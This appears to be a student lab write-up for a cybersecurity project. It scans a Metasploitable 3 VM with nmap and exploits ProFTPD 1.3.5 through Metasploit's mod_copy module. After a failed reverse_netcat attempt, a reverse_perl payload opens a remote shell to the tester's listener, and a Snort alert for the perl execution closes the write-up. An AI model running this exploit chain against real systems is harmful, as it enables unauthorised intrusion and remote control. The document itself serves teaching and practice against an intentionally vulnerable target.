# Cyberscecurity Project 2

some vulnerabilities of Metasploitable 3: <https://github.com/rapid7/metasploitable3/wiki/Vulnerabilities>

To get the IP of the VM:

`ip a`

and get the `eth1` IP

current ip: `172.28.128.3`

## Open Ports

```Not shown: 991 filtered ports
PORT     STATE  SERVICE     VERSION
21/tcp   open   ftp         ProFTPD 1.3.5
22/tcp   open   ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open   http        Apache httpd 2.4.7 ((Ubuntu))
445/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
631/tcp  open   ipp         CUPS 1.7
3000/tcp closed ppp
3306/tcp open   mysql       MySQL (unauthorized)
8080/tcp open   http        Jetty 8.1.7.v20120910
8181/tcp closed intermapper
MAC Address: 08:00:27:E0:15:6B (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: UBUNTU; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 12.22 seconds
```

## Vulnerabilities

### FPT

We can see that the port 21 is open with service **ftp** and version **ProFTPD 1.3.5**, so we perform a search on metasploit:

```bash
search proftpd
```

and we can see that:

```
Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/linux/misc/netsupport_manager_agent  2011-01-08       average    No     NetSupport Manager Agent Remote Buffer Overflow
   1  exploit/linux/ftp/proftp_sreplace            2006-11-26       great      Yes    ProFTPD 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)
   2  exploit/freebsd/ftp/proftp_telnet_iac        2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (FreeBSD)
   3  exploit/linux/ftp/proftp_telnet_iac          2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)
   4  exploit/unix/ftp/proftpd_modcopy_exec        2015-04-22       excellent  Yes    ProFTPD 1.3.5 Mod_Copy Command Execution
   5  exploit/unix/ftp/proftpd_133c_backdoor       2010-12-02       excellent  No     ProFTPD-1.3.3c Backdoor Command Execution
```

We will use 4 since it has a excellent rank and its more recent than 5 and also matches the version of the service, we will also check the options of the exploit:

```bash
use 4
show options
```

and based on the output:

```bash
Module options (exploit/unix/ftp/proftpd_modcopy_exec):                                                                                                                                    
                                                                                                                                                                                           
   Name       Current Setting  Required  Description                                                                                                                                       
   ----       ---------------  --------  -----------
   CHOST                       no        The local client address
   CPORT                       no        The local client port
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       HTTP port (TCP)
   RPORT_FTP  21               yes       FTP port
   SITEPATH   /var/www         yes       Absolute writable website path
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path to the website
   TMPPATH    /tmp             yes       Absolute writable path
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.104    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
```

`set rhosts 172.28.128.3`

`set sitepath /var/www/html`

**Missed Attack**

```bash
msf6 exploit(unix/ftp/proftpd_modcopy_exec) > run

[*] Started reverse TCP handler on 192.168.0.104:4444 
[*] 172.28.128.3:80 - 172.28.128.3:21 - Connected to FTP server
[*] 172.28.128.3:80 - 172.28.128.3:21 - Sending copy commands to FTP server
[*] 172.28.128.3:80 - Executing PHP payload /x7kh3w.php
[+] 172.28.128.3:80 - Deleted /var/www/html/x7kh3w.php
[*] Command shell session 1 opened (192.168.0.104:4444 -> 192.168.0.104:40142) at 2023-11-17 00:54:30 +0200
[-] 172.28.128.3:80 - Exploit aborted due to failure: unknown: 172.28.128.3:21 - Failure executing payload
[*] Exploit completed, but no session was created.
```

**Fixed**:

``` bash
set payload payload/cmd/unix/reverse_perl
``

```bash
[*] Started reverse TCP handler on 192.168.0.104:4444                                                                                                                                      
[*] 172.28.128.3:80 - 172.28.128.3:21 - Connected to FTP server                                                                                                                            
[*] 172.28.128.3:80 - 172.28.128.3:21 - Sending copy commands to FTP server                                                                                                                
[*] 172.28.128.3:80 - Executing PHP payload /TWmEi.php                                                                                                                                     
[+] 172.28.128.3:80 - Deleted /var/www/html/TWmEi.php                                                                                                                                      
[*] Command shell session 3 opened (192.168.0.104:4444 -> 192.168.0.104:46438) at 2023-11-17 01:03:35 +0200  
```

Detected:

```
11/16-16:31:14.340657  [**] [1:1356:5] WEB-ATTACKS perl execution attempt [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 172.28.128.1:40327 -> 172.28.128.3:80
```
